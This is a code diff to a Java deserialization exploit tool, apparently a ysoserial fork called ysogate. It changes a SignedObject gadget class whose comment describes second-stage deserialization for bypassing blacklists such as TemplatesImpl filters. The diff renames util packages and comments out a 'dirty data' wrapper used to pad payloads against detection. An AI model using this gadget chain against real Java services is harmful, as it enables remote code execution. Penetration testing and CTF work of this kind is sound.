@@ -12,9 +12,8 @@ import org.mozilla.javascript.*;
 import org.mozilla.javascript.tools.shell.Environment;
 import org.springframework.beans.factory.ObjectFactory;
 import A.R.ysogate.payloads.ObjectPayload;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.dirty.DirtyDataWrapper;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
@@ -29,7 +28,7 @@ import java.util.*;
 import static java.lang.Class.forName;
 import static A.R.ysogate.payloads.gadgets.Hibernate1.makeCaller;
 import static A.R.ysogate.payloads.gadgets.Hibernate1.makeGetter;
-import static A.R.ysogate.payloads.util.Utils.base64Decode;
+import static A.R.ysogate.payloads.utils.Utils.base64Decode;
 
 /**
  * SignedObject 二次反序列化 Gadget，用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）
@@ -95,11 +94,11 @@ public class SignedObject implements ObjectPayload<Object> {
 		ObjectPayload                        payload      = payloadClass.newInstance();
 		Object                               object       = payload.getObject(realCmd);
 
-		if (args.length >= 3) {
-			final String type   = args[2];
-			final String length = args[3];
-			object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
-		}
+//		if (args.length >= 3) {
+//			final String type   = args[2];
+//			final String length = args[3];
+//			object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
+//		}
 
 		return object;
 	}
